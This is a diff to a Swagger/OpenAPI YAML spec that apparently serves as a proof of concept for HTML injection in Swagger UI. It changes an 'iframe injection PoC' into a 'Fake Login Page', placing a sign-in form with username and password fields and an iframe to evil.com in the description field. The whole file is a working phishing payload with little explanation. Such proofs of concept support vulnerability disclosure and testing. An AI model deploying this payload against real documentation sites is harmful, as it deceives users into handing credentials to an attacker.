@@ -1,12 +1,33 @@
 swagger: '2.0'
-info: 
+info:
   version: 1.0.0
-  title: iframe injection PoC❗️
+  title: Fake Login Page❗️
   description: |
-    <iframe src="https://evil.com" width="600" height="400"></iframe>
+    <img src="https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test2.png" />
+    <div class="login-form">
+      <div class="heading">
+        <h1>SIGN IN</h1>
+      </div>
+      <div class="form-container">
+        <form class="form-signin">
+          <div class="form-group">
+            <label for="username">Username:</label>
+            <input type="text" name="username" size="20" />
+          </div>
+          <div class="form-group">
+            <label for="password">Password:</label>
+            <input type="password" name="password" size="20" />
+          </div>
+          <div class="form-group">
+            <button type="submit" class="btn btn-defaul">Login</button>
+          </div>
+          <iframe src="https://evil.com" width="600" height="400"></iframe>
+        </form>
+      </div>
+    </div>
 paths:
   /:
     post:
       responses:
         '200':
-          description: PoC successful
+          description: Login successful
